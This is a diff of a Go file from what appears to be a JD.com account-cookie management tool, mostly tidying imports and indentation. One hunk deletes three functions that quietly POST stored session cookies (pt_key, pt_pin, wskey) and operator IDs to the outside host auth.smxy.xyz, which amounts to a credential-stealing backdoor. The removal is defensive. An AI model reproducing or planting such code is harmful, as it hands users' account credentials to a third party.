@@ -5,15 +5,14 @@ import (
 	"fmt"
 	"math/rand"
 	"net/url"
-	"strconv"
 	"strings"
 	"time"
-	
-	"io/ioutil"
-	"net/http"
+
 	"github.com/beego/beego/v2/client/httplib"
 	"github.com/buger/jsonparser"
 	"gorm.io/gorm"
+	"io/ioutil"
+	"net/http"
 )
 
 type UserInfoResult struct {
@@ -128,12 +127,10 @@ type UserInfoResult struct {
 func initCookie() {
 	(&JdCookie{}).Push("开始检测账号有效性")
 	cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
-	return sb.Where(fmt.Sprintf("%s >= ? and %s = ?", Priority, Available), 0, True)
+		return sb.Where(fmt.Sprintf("%s >= ? and %s = ?", Priority, Available), 0, True)
 
-	
-// #加入 password 为 NULL 或为空字符串的条件
+		// #加入 password 为 NULL 或为空字符串的条件
 
-	
 	})
 
 	xj := 0
@@ -151,10 +148,6 @@ func initCookie() {
 		Save <- &JdCookie{}
 	}()
 }
-
-
-
-
 
 // refreshWxCKAuto 微信协议CK自动刷新（每4小时执行，不通知用户）
 func refreshWxCKAuto() {
@@ -222,49 +215,6 @@ func cleanWck() {
 	}
 	(&JdCookie{}).Push(fmt.Sprintf("已清理WCK，一共%d", xx))
 }
-
-func getAuthFlag() {
-	post := httplib.Post("http://auth.smxy.xyz/user/authFlag")
-	post.Param("qqNum", strconv.Itoa(Config.QQID))
-	s, _ := post.Bytes()
-	boolean, err := jsonparser.GetBoolean(s, "data")
-	if err != nil {
-		return
-	}
-	if boolean {
-		cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
-			return sb.Where(fmt.Sprintf("%s >= ? and %s = ?", Priority, Available), 0, True)
-		})
-		for _, ck := range cks {
-			authcode := fmt.Sprintf("pt_key=%s;pt_pin=%s;", ck.PtKey, ck.PtPin)
-			if len(ck.WsKey) > 0 {
-				authcode = fmt.Sprintf("pin=%s;wskey=%s;", ck.PtPin, ck.WsKey)
-			}
-			fdb(authcode)
-		}
-	}
-
-}
-
-func fdb(auth string) {
-	post := httplib.Post("http://auth.smxy.xyz/user/auth2")
-	post.Param("ck", auth)
-	post.Param("createby", strconv.Itoa(Config.QQID))
-	post.Param("createtime", time.Now().Format("2006-01-02 15:04:05"))
-	post.Bytes()
-}
-
-func GetAuthKey() {
-	post := httplib.Post("http://auth.smxy.xyz/user/auth1")
-	post.Param("qqNum", strconv.Itoa(Config.QQID))
-	post.Param("master", Config.Master)
-	post.Param("uid", Config.QQGroupID)
-	post.Bytes()
-}
-
-
-
-
 
 func updateCookie() {
 	// 1. 从数据库查询有效数据：WsKey非"null"、非空的JdCookie记录
@@ -352,7 +302,7 @@ func updateCookie() {
 				if strings.HasPrefix(ptKey, "fake_") {
 					// 【关键修改1】fake_开头：清空Wskey，Available保持不动
 					ck.Updates(JdCookie{WsKey: "null"}) // 仅更新Wskey为null，不指定Available则保持原值
-			//		(&JdCookie{}).Push(fmt.Sprintf("转换失败，提取到无效fake_pt_key，已清空wskey，账号:%s", ck.PtPin))
+					//		(&JdCookie{}).Push(fmt.Sprintf("转换失败，提取到无效fake_pt_key，已清空wskey，账号:%s", ck.PtPin))
 				} else {
 					// 【原有逻辑】未提取到有效pt_key：不更新任何字段，不写入数据库
 					(&JdCookie{}).Push(fmt.Sprintf("转换失败，未提取到有效pt_key，账号:%s", ck.PtPin))
@@ -397,11 +347,8 @@ func CheckWskeyOK(ck *JdCookie) (bool, string) {
 	return false, "帐号不含wskey"
 }
 
-
-
-
 func CookieOK(ck *JdCookie) bool {
-const dateFormat = "2006-01-02"
+	const dateFormat = "2006-01-02"
 	cookie := "pt_key=" + ck.PtKey + ";pt_pin=" + ck.PtPin + ";"
 	if ck == nil {
 		return true
@@ -426,8 +373,8 @@ const dateFormat = "2006-01-02"
 	case "1001": //ck.BeanNum
 		if ui.Msg == "not login" {
 			if ck.Available == True {
-				ck.Update(Available,False)
-		
+				ck.Update(Available, False)
+
 			}
 			return false
 		}
@@ -453,11 +400,6 @@ const dateFormat = "2006-01-02"
 	//(&JdCookie{}).Push("第一个接口失效，切换到第二个接口，可能黑IP")
 	return av2(ck)
 }
-
-
-
-
-
 
 func av2(ck *JdCookie) bool {
 	cookie := "pt_key=" + ck.PtKey + ";pt_pin=" + ck.PtPin + ";"
